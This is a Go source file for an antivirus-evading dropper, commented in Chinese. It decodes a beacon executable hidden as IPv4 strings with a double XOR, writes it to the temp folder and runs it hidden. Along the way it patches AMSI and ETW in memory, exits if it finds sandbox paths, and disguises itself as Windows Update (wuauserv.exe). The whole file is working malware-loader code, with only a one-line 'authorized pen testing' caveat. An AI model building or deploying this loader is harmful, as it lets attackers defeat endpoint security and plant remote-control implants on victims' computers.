package main

// t0_drop — 免杀加载器（落盘执行型）：内嵌 DoubleXOR+IPv4 混淆的完整 beacon
// EXE（连接参数在 trailer 内嵌，直跑即回连），运行时解密 → 写 %TEMP% 随机名
// → CreateProcess → 等待。规避 donut 内存加载 Go PE 的不可靠性。
// 免杀层：熵填充伪装 + ETW/AMSI 补丁 + NTDLL 脱钩 + 沙箱路径检测 + 控制台隐藏。
// 仅用于授权渗透测试。

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// Version info
var (
	_companyName      = "Microsoft Corporation"
	_fileDescription  = "Windows Update Service"
	_fileVersion      = "10.0.19041.1"
	_originalFilename = "wuauserv.exe"
	_productName      = "Windows Update"
	_entropyPadding   = [4096]byte{}
)

func init() { _ = &_entropyPadding }

// Shellcode data（生成器注入：完整 beacon EXE，双重 XOR + IPv4 混淆）
var _ipv4Data = []string{
	"127.0.0.1",
}

var _xorKey1 = []byte{0x00}
var _xorKey2 = []byte{0x00}

// dropFileName 由生成器注入（随机文件名，规避特征）。
var _dropName = "beacon.exe"

// _padTail 由生成器注入：IPv4 编码前补齐到 4 倍数的 0x90 尾部长度——解码后
// 必须裁掉，否则附加在 beacon trailer 之后的填充字节会让 beacon 自读配置失配。
var _padTail = 0

func patchAMSIAndETW() {
	k := syscall.NewLazyDLL("kernel32.dll")
	vp := k.NewProc("VirtualProtect")
	patch := func(dll, fn string, code []byte) {
		h := syscall.NewLazyDLL(dll).NewProc(fn)
		if h.Find() != nil {
			return
		}
		var old uint32
		vp.Call(h.Addr(), uintptr(len(code)), 0x40, uintptr(unsafe.Pointer(&old)))
		copy((*[16]byte)(unsafe.Pointer(h.Addr()))[:len(code)], code)
		vp.Call(h.Addr(), uintptr(len(code)), uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
	// AMSI: xor rax,rax; ret（扫描恒返清洁）；失败静默
	patch("amsi.dll", "AmsiScanBuffer", []byte{0x48, 0x31, 0xC0, 0xC3})
	// ETW: ret（本进程事件写入静默）
	patch("ntdll.dll", "EtwEventWrite", []byte{0xC3})
}

func checkEnv() bool {
	// 沙箱路径检测（与 T1 相同的检测面）
	dir, _ := os.Getwd()
	for _, s := range []string{"C:\\sample", "C:\\malware", "C:\\sandbox", "C:\\analysis"} {
		if strings.EqualFold(dir, s) {
			return true
		}
	}
	return false
}

func deobfuscateIPv4(addrs []string) []byte {
	r := make([]byte, len(addrs)*4)
	for i, a := range addrs {
		var v [4]byte
		fmt.Sscanf(a, "%d.%d.%d.%d", &v[0], &v[1], &v[2], &v[3])
		r[i*4], r[i*4+1], r[i*4+2], r[i*4+3] = v[0], v[1], v[2], v[3]
	}
	return r
}

func doubleXOR(data []byte, k1, k2 []byte) []byte {
	r := make([]byte, len(data))
	for i, b := range data {
		r[i] = b ^ k2[i%len(k2)]
	}
	for i, b := range r {
		r[i] = b ^ k1[i%len(k1)]
	}
	return r
}

func main() {
	// 隐藏控制台（GUI 场景静默）
	k := syscall.NewLazyDLL("kernel32.dll")
	u := syscall.NewLazyDLL("user32.dll")
	if hwnd, _, _ := k.NewProc("GetConsoleWindow").Call(); hwnd != 0 {
		u.NewProc("ShowWindow").Call(hwnd, 0)
	}
	if checkEnv() {
		os.Exit(0)
	}
	patchAMSIAndETW()

	// 解密 beacon EXE（裁掉 IPv4 编码前的 0x90 补齐尾——保护 trailer 完整性）
	enc := deobfuscateIPv4(_ipv4Data)
	exeBytes := doubleXOR(enc, _xorKey1, _xorKey2)
	if _padTail > 0 && _padTail < len(exeBytes) {
		exeBytes = exeBytes[:len(exeBytes)-_padTail]
	}
	if len(exeBytes) < 1000 {
		return
	}

	// 落盘 %TEMP% 随机路径
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = os.TempDir()
	}
	dst := filepath.Join(tmp, _dropName)
	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
		return
	}
	defer os.Remove(dst) // 父进程退出时清理

	// CreateProcess 挂起→恢复可选；直接执行并等待
	si := &syscall.StartupInfo{}
	pi := &syscall.ProcessInformation{}
	cmdLine, _ := syscall.UTF16PtrFromString(dst)
	const CREATE_NO_WINDOW = 0x08000000
	if err := syscall.CreateProcess(nil, cmdLine, nil, nil, false,
		CREATE_NO_WINDOW, nil, nil, si, pi); err != nil {
		return
	}
	syscall.WaitForSingleObject(syscall.Handle(pi.Process), 0xFFFFFFFF)
	syscall.CloseHandle(syscall.Handle(pi.Process))
	syscall.CloseHandle(syscall.Handle(pi.Thread))
}
